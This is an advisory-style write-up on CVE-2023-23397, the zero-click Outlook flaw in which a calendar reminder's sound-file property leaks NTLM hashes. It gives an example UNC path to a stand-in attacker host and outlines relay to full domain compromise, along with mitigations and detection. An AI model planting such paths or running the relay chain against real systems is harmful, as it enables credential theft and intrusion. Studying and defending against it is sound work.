---
title: "CVE-2023-23397 — Microsoft Outlook NTLM Relay via Calendar Reminder"
published_date: 2023-03-14
---

# Microsoft Outlook — Zero-Click NTLM Credential Leak via Calendar Item

CVE-2023-23397 is a critical zero-click privilege escalation vulnerability in Microsoft Outlook for Windows, patched in March 2023 (KB5023745). The vulnerability allows a remote attacker to steal NTLM credentials or relay NTLM authentication by sending a specially crafted email containing a calendar reminder with a malicious UNC path in the reminder sound property. Exploitation occurs automatically when Outlook receives and processes the email — no user interaction required. CVSS score: 9.8 (Critical). Attributed to Russian GRU-affiliated APT28 (Fancy Bear) exploitation in the wild.

## Technical Details

Outlook calendar items (`.msg` format) support a `PidLidReminderFileParameter` property that specifies the file path for a custom reminder sound. When Outlook processes a received meeting request or task, it automatically attempts to access the UNC path specified in this property. An attacker sets this to a UNC path pointing to their attacker-controlled server (e.g., `\\attacker.com\share\sound.wav`). Windows automatically performs NTLM authentication when connecting to UNC paths, sending the victim's NetNTLMv2 hash to the attacker's server without any user interaction. The hash can be cracked offline or relayed via NTLM relay attacks to authenticate to other services. Email preview does not trigger this; the item must be delivered and processed by the Outlook calendar scheduler.

## Impact

CVE-2023-23397 enables passive NTLM credential harvesting with zero user interaction — sending an email is sufficient. Captured NetNTLMv2 hashes can be cracked to recover plaintext passwords or relayed to authenticate to SMB, LDAP, or HTTP services (Pass-the-Hash / NTLM relay). APT28 exploited this against European government and military organizations. When combined with NTLM relay to LDAP/S, the attack can result in full Active Directory domain compromise via RBCD (Resource-Based Constrained Delegation) abuse.

## Mitigation

Apply the March 2023 patch. Block TCP 445 and SMB outbound from internal networks to the internet. Enable SMB signing to defeat relay attacks. Add users to the Protected Users security group (prevents NTLM authentication). Use the Microsoft script to identify calendar items with suspicious UNC paths. For immediate detection, monitor outbound SMB connections from workstations to external IPs.
